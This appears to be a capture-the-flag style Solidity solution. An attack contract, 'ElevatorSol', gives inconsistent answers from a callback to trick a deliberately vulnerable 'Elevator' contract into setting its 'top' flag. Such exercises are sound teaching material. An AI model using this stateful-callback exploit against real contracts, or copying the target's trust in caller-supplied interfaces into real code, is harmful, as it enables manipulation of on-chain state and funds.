// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ElevatorSol {
    Elevator targetContract;
    uint public floor;

    constructor (address _targetContract) {
        targetContract = Elevator(_targetContract);
        floor = 0;
    }

    function attack() public {
        targetContract.goTo(1);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        bool ret = _floor == floor;
        floor = _floor;
        return ret;
    }

}

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
